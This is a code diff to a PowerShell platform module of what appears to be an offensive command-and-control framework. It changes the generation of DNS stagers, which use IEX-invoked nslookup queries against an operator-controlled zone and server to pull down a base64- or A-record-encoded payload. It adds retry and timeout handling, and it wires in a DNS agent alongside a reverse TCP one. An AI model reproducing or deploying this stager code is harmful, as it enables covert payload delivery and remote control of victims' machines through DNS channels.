@@ -64,12 +64,12 @@ class PlatformPowershell(Platform, ModuleBase):
                 'Options'       :   ("DEFAULT", "DNSCAT2", "DNSCAT2DOWNLOADER")
             },
             'TIMEOUT': {
-                'Description'   :   'Number of seconds to wait for each request (currently only supported by DNS TXT)',
+                'Description'   :   'Number of seconds to wait for each request (currently only supported by DNS stagers)',
                 'Required'      :   True,
                 'Value'         :   9
             },
             'RETRIES': {
-                'Description'   :   'Retry each request for this number of times (currently only supported by DNS TXT)',
+                'Description'   :   'Retry each request for this number of times (currently only supported by DNS stagers)',
                 'Required'      :   True,
                 'Value'         :   2
             },
@@ -269,26 +269,36 @@ class PlatformPowershell(Platform, ModuleBase):
             dnstype = self.handler.transport.options['DNSTYPE']['Value']
             timeout = self.options['TIMEOUT']['Value']
             retries = self.options['RETRIES']['Value']
-            print_debug(DEBUG_MODULE, "zone = {}, server = {}, dnstype = {}".format(zone, server, dnstype))
+            print_debug(DEBUG_MODULE, "zone = {}, server = {}, dnstype = {}, timeout = {}, retries = {}"
+                        .format(zone, server, dnstype, timeout, retries))
+
             if server is None:
                 server = ""
+            if int(timeout) == 2:  # 2 seconds is the default timeout for nslookup and can be ommited
+                timeoutstr = ""
+            else:
+                timeoutstr = " -timeout={}".format(timeout)
+            if int(retries) <= 0:  # 0 is no retries = 1 attempt in total, ommit all retry text
+                retriesreset = ""
+                retriestest = ""
+            else:
+                retriesreset = "$t=0;"
+                retriestest = "if($t++-lt{}){{$i--;continue;}}".format(retries)
 
             # TODO: Consider using helps.randomize_capitalization(...)
             stager = '$r=Get-Random;'
             if dnstype == "TXT":
-                # TODO: here TIMEOUT and RETRIES are already implemented, consider adding the special cases for
-                #   TIMEOUT=2 (default in nslookup) and RETRIES=0
-                stager += '$a="";$t=0;for($i=0;;$i++){'
-                stager += '$c=([string](IEX "nslookup -type=TXT -timeout={} s$($i)r$($r).{}. {}")).Split({})[1];'\
-                    .format(timeout, zone, server, "'\"'")
-                stager += 'if(!$c){{if($t++-gt{}){{break;}}$i--;continue;}}$t=0;$a+=$c;}}'.format(retries+1)
+                stager += '$a="";{}for($i=0;;$i++){{'.format(retriesreset)
+                stager += '$c=([string](IEX "nslookup -type=TXT{} s$($i)r$($r).{}. {}")).Split({})[1];'\
+                    .format(timeoutstr, zone, server, "'\"'")
+                stager += 'if(!$c){{{}break;}}{}$a+=$c;}}'.format(retriestest, retriesreset)
                 stager += '$a=[Convert]::FromBase64String($a);'
             elif dnstype == "A":
-                # TODO: implement RETRIES
-                stager += '$a=New-Object char[](0);for($i=0;;$i++){'
-                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A -timeout={} s$($i)r$($r).{}. {}"));'\
-                    .format(timeout, zone, server)
-                stager += 'if($c.Length-lt7-or$c.Length-gt11){break;}$a+=$c[-2].Split(".")}'
+                stager += '$a=New-Object char[](0);{}for($i=0;;$i++){{'.format(retriesreset)
+                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A{} s$($i)r$($r).{}. {}"));'\
+                    .format(timeoutstr, zone, server)
+                stager += 'if($c.Length-lt7-or$c.Length-gt11){{{}break;}}{}$a+=$c[-2].Split(".")}}'\
+                    .format(retriestest, retriesreset)
                 stager += '$a=$a|%{[Convert]::ToInt32($_)};'
             else:
                 print_error("invalid DNSTYPE")
@@ -483,9 +493,7 @@ class PlatformPowershell(Platform, ModuleBase):
             f = open(self.platformpath + "/transport/reversetcp.ps1", 'r')
 
         elif self.handler.options['TRANSPORT']['Value'] == "DNS":
-            # TODO: implement agent for Powershell and DNS here!
-            print_error("No agent module for platform and transport found.")
-            return None
+            f = open(self.platformpath + "/transport/dns.ps1", 'r')
 
         # combination platform / transport currently not supported
         else:
